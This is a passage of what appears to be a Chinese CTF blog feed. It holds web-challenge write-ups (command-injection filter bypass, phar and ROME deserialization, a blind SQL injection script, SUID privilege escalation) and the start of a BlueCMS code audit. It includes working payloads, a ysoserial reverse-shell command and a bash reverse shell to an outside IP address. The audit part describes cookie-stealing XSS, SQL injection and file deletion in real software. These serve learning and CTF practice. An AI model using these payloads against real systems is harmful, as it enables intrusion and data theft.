class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;id=whoami</span><br><span class="line">    </span><br><span class="line">?dajs=ls</span><br></pre></td></tr></table></figure><p>flag在环境变量里。</p><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了很多。主要是</p><ul><li><p>关键词绕过</p><p>通配符，插入空字符绕过等等</p></li><li><p>；绕过</p><p>%0a或者&amp;&amp;绕过</p></li><li><p>&#x2F;绕过</p><p><code>ls /</code> &#x3D;&#x3D; <code>cd 路径；ls</code></p><p>返回上级目录 <code>cd ..</code></p></li><li><p>空格绕过</p><p><code>$&#123;IFS&#125;</code>等等</p></li></ul><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=cd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>aca$<span class="number">1</span>t$&#123;IFS&#125;ffff$<span class="number">1</span>llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h4><p>unicode编码绕过，catch_warnings被过滤，换一个类比如os._wrap_close就好了。</p><h4 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h4><p>考点：phar反序列化，#绕过</p><p>文件上传给出上传后文件路径</p><p>注释中提示class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>#绕过</p><ol><li>闭合php标签</li><li>\n</li><li>\r</li></ol><p>这里只能用\r。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;\rsystem(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的phar改图片后缀名上传后，在class.php下用phar协议访问（只要是phar文件，后缀名是什么都可以解析）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">class</span>.php?file=phar:<span class="comment">//file_path</span></span><br></pre></td></tr></table></figure><h4 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h4><p>0^0和0^1，回显两种情况，猜测使用盲注。</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数字</span></span><br><span class="line"><span class="comment">#0^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)</span></span><br><span class="line"><span class="comment">#单引号</span></span><br><span class="line"><span class="comment">#0&#x27; or (ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SqlBlind</span>():</span><br><span class="line"></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line"><span class="comment">#wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment">#where(user=&#x27;f1ag_is_here&#x27;)</span></span><br><span class="line">            params=&#123;</span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;c&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;comment&#x27;:&quot;hack&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_information&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                 <span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user=&#x27;f1ag_is_here&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 请求方式</span></span><br><span class="line">            <span class="comment">#r=requests.get(url=url,params=params)</span></span><br><span class="line">            r=requests.post(url=url,data=params)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 防止429</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#r=requests.get(url=url2)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 编码</span></span><br><span class="line">            <span class="comment">#r=str(r.json())</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># True的标志  0的个数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;好耶&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># if r.text.count(&#x27;0&#x27;)==i:</span></span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line"></span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left &lt;=<span class="number">32</span> <span class="keyword">or</span> right &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>,result)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    SqlBlind()</span><br></pre></td></tr></table></figure><h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/*    */</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerController</span></span><br><span class="line"><span class="comment">/*    */</span> &#123;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 19 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do you like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">(<span class="meta">@RequestParam</span> String EXP)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">/* 24 */</span>     <span class="keyword">if</span> (EXP.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">/* 25 */</span>       <span class="keyword">return</span> <span class="string">&quot;Do you know Rome Serializer?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/* 27 */</span>     <span class="type">byte</span>[] exp = Base64.getDecoder().decode(EXP);</span><br><span class="line"><span class="comment">/* 28 */</span>     <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line"><span class="comment">/* 29 */</span>     <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line"><span class="comment">/* 30 */</span>     objectInputStream.readObject();</span><br><span class="line"><span class="comment">/* 31 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do You like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span> &#125;</span><br></pre></td></tr></table></figure><p>反序列化点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure><p>ROME反序列化分析</p><p><a href="https://www.yulate.com/292.html">https://www.yulate.com/292.html</a></p><blockquote><p>java版本要jdk8u-121照着文章本地复现了，但是用ysoserial写了反弹shell，题目的发送过去不可以</p></blockquote><p>这周发现只要把payload拿去url编码后就可以了。</p><p>这里思考了得出的结果是</p><blockquote><p>RFC3986中指定了以下字符为保留字符：! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>　　不安全字符：还有一些字符，当他们直接放在URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符，原因有很多。</p><ul><li>空格：Url 在传输的过程，或者用户在排版的过程，或者文本处理程序在处理Url的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。</li><li>引号以及&lt;&gt;：引号和尖括号通常用于在普通文本中起到分隔Url的作用</li><li>#：通常用于表示书签或者锚点</li><li>%：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码</li><li>{}|^[]&#96;~：某一些网关或者传输代理会篡改这些字符</li></ul></blockquote><p>而base64加密后可能会出现<code>+,/,=</code></p><p>解题步骤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>xxx为base64后的<code>bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1</code></p><p>这里<code>&gt; 1.txt</code>是因为如果我加了<code>|base64</code>生成了之后会出现其他符号</p><p><img src="/../images/image-20221018174601257-1686150281426.png" alt="image-20221018174601257"></p><p>用python或者cyberchef来base64加密</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXP=对上面生成的base64再进行url编码</span><br></pre></td></tr></table></figure><p>连接后flag在根目录</p><p><img src="/../images/image-20221018174256886-1686150281426.png" alt="image-20221018174256886"></p><h3 id="week-5"><a href="#week-5" class="headerlink" title="week 5"></a>week 5</h3><h4 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h4><p>直接利用<code>&gt;</code>写入木马，然后一开始使用蚁剑连接</p><p>读取根目录下的start.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo $FLAG &gt; /ffll444aaggg &amp;&amp; export FLAG=not &amp;&amp; FLAG=not &amp;&amp; chmod 700 /ffll444aaggg &amp;&amp; \</span><br><span class="line">service apache2 restart &amp;&amp; \</span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><p>这里<code>chmod 700 /ffll444aaggg</code>的意思就是&#x2F;ffll444aaggg只有root用户可以访问。</p><p>然后第一个想到的就是用suid提权，因为之前哪一周的misc是用到了这个知识点。</p><p>但是没有想到的是蚁剑的终端太不好用了（其实我之前觉得蚁剑挺强的，因为它自带那些绕过插件）</p><p>比如变量赋值没用</p><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019102635-1686150281426.png" alt="QQ图片20221019102635"></p><p>查找具有suid的命令没用</p><p><img src="/../images/image-20221019102841851-1686150281426.png" alt="image-20221019102841851"></p><p>反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@out:/$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/date</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line"></span><br><span class="line">www-data@out:/$ date -f ffll444aaggg</span><br><span class="line">date -f ffll444aaggg</span><br><span class="line">date: invalid date &#x27;flag&#123;1f005b40-39e2-4538-8816-3e27bdd98352&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019103452-1686150281426.png" alt="QQ图片20221019103452"></p><h4 id="final-round"><a href="#final-round" class="headerlink" title="final round"></a>final round</h4><p>时间盲注</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<ul><li><p><input checked="" disabled="" type="checkbox"> BlueCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> SeaCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> DedeCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> ThinkPHP</p></li></ul><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p><a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>From <a href="https://www.anquanke.com/post/id/265092#h3-5">https://www.anquanke.com/post/id/265092#h3-5</a></p><ul><li>函数集文件，通常命名包含function或者common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。</li><li>配置文件，通常命名中包括config关键字，配置文件包括web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是单引号还是用双引号括起来，如果是双引号可能就存在代码执行的问题了。</li><li>安全过滤文件，安全过滤文件对代码审计至关重要，这关系到我们挖掘到的可以点能否直接利用，通常命名中带有filter、safe、check等关键字，这类文件主要是对参数进行过滤，大多数的应用其实会在参数的输入做一下addslashes()函数的过滤。</li><li>index文件，index是一个程序的入口，所以通常我们只要读一读index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件有哪些。而不同目录的index文件也有不同的实现方式，建议最好将几个核心目录的index文件都通读一遍。</li></ul><h1 id="总结大致流程"><a href="#总结大致流程" class="headerlink" title="总结大致流程"></a>总结大致流程</h1><p><strong>1、先全局总览：入口文件、路由、全局处理方式等</strong><br><strong>2、定向功能审计：黑盒(找到敏感功能)+白盒（定位到代码进行审计）</strong><br><strong>3、敏感函数回溯</strong></p><p>先黑盒+白盒看敏感功能，再用自动化审计工具跑一遍并验证，最后再根据漏洞危险函数去回溯</p><h3 id="自动化审计工具"><a href="#自动化审计工具" class="headerlink" title="自动化审计工具"></a>自动化审计工具</h3><p>RIPS<a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p><p>seay</p><p>Fortify</p><h1 id="bluecms"><a href="#bluecms" class="headerlink" title="bluecms"></a>bluecms</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><h4 id="用户注册"><a href="#用户注册" class="headerlink" title="用户注册"></a>用户注册</h4><p>在注册时，邮箱插入xss代码</p><p><img src="/../images/image-20221202120912126-1686141975680.png" alt="image-20221202120912126"></p><p><img src="/../images/image-20221202120807928-1686141975682.png" alt="image-20221202120807928"></p><p><img src="/../images/image-20221202120844185-1686141975683.png" alt="image-20221202120844185"></p><h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p>上传文件，只允许上传图片后缀的文件，上传后有给出图片路径，那么不能配合.htaccess，需要找到一个文件包含的点来包含文件。</p><p><img src="/../images/image-20221202121559453.png" alt="image-20221202120844185"></p><h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><p>是否存在越权,测试了没有</p><h4 id="发布新闻"><a href="#发布新闻" class="headerlink" title="发布新闻"></a>发布新闻</h4><p><img src="/../images/image-20221202122851275.png" alt="image-20221202120844185"></p><p>这里分类选择不了，应该是要管理员发布。</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>管理员</p><p><img src="/../images/image-20221202123640697-1686141975683.png" alt="image-20221202123640697"></p><p>其他</p><p><img src="/../images/image-20221202125147298-1686141975683.png" alt="image-20221202125147298"></p><h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><p><img src="/../images/image-20221202123831559-1686141975683.png" alt="image-20221202123831559"></p><p>这里没有验证码验证，那么可以很轻松地进行爆破，得到usernmae&#x3D;admin，passwd&#x3D;admin</p><p><img src="/../images/image-20221202124055555.png" alt="image-20221202120844185"></p><p>进去之后，可以看到一个建议，install文件夹，上面通过dirsearch也扫描出了这个文件，如果我们可以使用这个文件夹来重新安装网站，那么我们就可以直接重置管理员了，可惜是不可以的。</p><p><img src="/../images/image-20221202124235008-1686141975683.png" alt="image-20221202124235008"></p><h4 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h4><p>发布本地新闻这里存在一个文件上传操作，但是也只能上传图片</p><p><img src="/../images/image-20221202175209000-1686141975683.png" alt="image-20221202175209000"></p><h4 id="会员管理"><a href="#会员管理" class="headerlink" title="会员管理"></a>会员管理</h4><p>可以发现触发了之前的xss，那么如果我们没有登陆上后台，也可以通过这个xss来🎣获取管理员的cookie。</p><p><img src="/../images/image-20221202124632258-1686141975683.png" alt="image-20221202124632258"></p><p>也可以修改管理员密码，而且没有任何验证，可以直接修改。。</p><p><img src="/../images/image-20221202175052927-1686141975686.png" alt="image-20221202175052927"></p><h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><p>先看一下目录</p><p><img src="/../images/image-20221202155440394-1686141975685.png" alt="image-20221202155440394"></p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><p>先看一下前台的index.php，内容差不多就是渲染页面，没有用户可控的参数，所以关注其包含的其他文件。</p><p><img src="/../images/image-20221202135553953-1686141975686.png" alt="image-20221202135553953"></p><p>跟进common.inc.php看一下</p><p>关键部分，用来验证用户身份，其中cookie中的参数是可控的。</p><p><img src="/../images/image-20221202135942047-1686141975683.png" alt="image-20221202135942047"></p><p>先判断cookie中是否有user_id，有的话再继续判断user_name和user_pwd是否存在，如果存在就check_cookie，如果只有user_name存在就查询名字是否只有一个，其他情况set_cookie。</p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>跟进check_cookie</p><p><img src="/../images/image-20221202140225964-1686141975683.png" alt="image-20221202140225964"></p><p>查username对应的密码，经过散列处理判断密码是否正确。</p><p>跟进getone–在include&#x2F;mysql.class.php中</p><p><img src="/../images/image-20221202140336939-1686141975683.png" alt="image-20221202140336939"></p><p><img src="/../images/image-20221202140349680-1686141975683.png" alt="image-20221202140349680"></p><p><img src="/../images/image-20221202185616902-1686141975684.png" alt="image-20221202185616902"></p><p>可以看到没有对sql语句做任何处理，直接用mysql_query进行查询，sql语句错误时，返回错误消息Query error，然后是前面加了一个@，所以不能用报错注入。</p><p>再观察include&#x2F;mysql.class.php可以发现</p><p><img src="/../images/image-20221202190550614.png" alt="image-20221202120844185">发现存在宽字节注入，那么这个CMS就可以随便注入了。。。（因为所有的sql操作都是用这个mysql类）</p><p>以ad_js.php为例</p><p><img src="/../imaages/image-20221202190230473.png" alt="image-20221202120844185"></p><p><img src="/../images/image-20221202190707634-1686141975684.png" alt="image-20221202190707634"></p><h4 id="文件包含-文件上传"><a href="#文件包含-文件上传" class="headerlink" title="文件包含+文件上传"></a>文件包含+文件上传</h4><p>虽然有白名单限制，只能上传图片，但是没有对文件内容进行过滤</p><p><img src="/../images/image-20221202171406255-1686141975684.png" alt="image-20221202171406255"></p><p>并且在user.php中，没有对$_POST[‘pay’]进行过滤，存在目录穿越，就可以包含上传的用户头像。</p><p><img src="/../images/image-20221202185910243-1686141975684.png" alt="image-20221202185910243"></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>publish.php</p><p><img src="/../images/image-20221202190938927-1686141975684.png" alt="image-20221202190938927"></p><p>user.php</p><p>​<img src="/../images/image-20221202194855624-1686141975684.png" alt="image-20221202194855624"></p><p>需要先插入一条新闻，新闻名为要删除的文件的路径。</p><h3 id="后台–-x2F-admin"><a href="#后台–-x2F-admin" class="headerlink" title="后台–&#x2F;admin"></a>后台–&#x2F;admin</h3><p>还是先看一下index.php，也是只是输出了CMS和系统的一些信息，所以关注其包含的文件</p><p><img src="/../images/image-20221202191939851-1686141975684.png" alt="image-20221202191939851"></p><p>关键内容</p><p><img src="/../images/image-20221202192232288-1686141975684.png" alt="image-20221202192232288"></p><p>对输入的参数都使用addslashes()进行转义,不过还有<code>$SERVER</code>没有进行处理。</p><p><img src="/../images/image-20221202192459456.png" alt="image-20221202120844185"></p><p>​使用session来验证admin身份。还是一样的使用check_cookie来判断，</p><p>​<img src="/../images/image-20221202140225964.png" alt="image-20221202120844185"></p><p>​需要得到admin的pwd和cookie_hash，这两个都在数据库中，可以利用前台的sql注入获得，所以可以通过这个来登录admin用户。</p><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p><img src="/../images/image-20221202195311948-1686141975684.png" alt="image-20221202195311948"></p><p><img 